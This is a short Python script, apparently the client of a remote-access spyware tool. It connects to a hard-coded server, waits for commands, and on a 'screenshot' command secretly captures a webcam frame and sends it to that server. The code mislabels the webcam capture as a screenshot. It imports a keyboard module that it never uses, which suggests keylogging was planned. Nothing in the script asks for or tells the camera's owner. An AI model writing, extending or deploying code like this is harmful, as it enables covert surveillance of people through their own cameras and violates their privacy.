import socket
import cv2
import threading
import keyboard
from threading import Timer
from datetime import datetime

SERVER_HOST = "192.168.0.8"  # Update this to match your server's IP
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128  # Buffer size for receiving data

# Create the socket object and connect to the server
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))


# Class to handle commands received from the server
class Command:
    def __init__(self):
        self.command = None

    def receive(self):
        self.command = s.recv(BUFFER_SIZE).decode()
        return self.command

    def execute(self):
        print("Waiting for commands")
        while True:
            self.receive()
            if self.command == "screenshot":
                print("Taking screenshot")
                screenshot = Screenshot()
                screenshot.start()  # Capture and send screenshot
            elif self.command == "exit":
                s.close()
                break


# Class to capture and send a screenshot to the server
class Screenshot:
    def __init__(self):
        self.screenshot = None

    def take_screenshot(self):
        # OpenCV code to capture a screenshot
        self.screenshot = cv2.VideoCapture(0)
        ret, frame = self.screenshot.read()
        if ret:
            _, img_encoded = cv2.imencode(".jpg", frame)
            return img_encoded.tobytes()
        return None

    def start(self):
        screenshot = self.take_screenshot()
        if screenshot:
            # Send a special header to indicate that an image is being sent
            s.sendall("image".encode())
            s.recv(1024)  # Wait for the server to be ready
            # Send the length of the image
            s.sendall(f"{len(screenshot)}".encode())
            s.recv(1024)  # Wait for server acknowledgment
            # Send the actual screenshot data
            s.sendall(screenshot)
            print("Screenshot sent")


# Main program execution
command = Command()
command_thread = threading.Thread(target=command.execute)
command_thread.start()
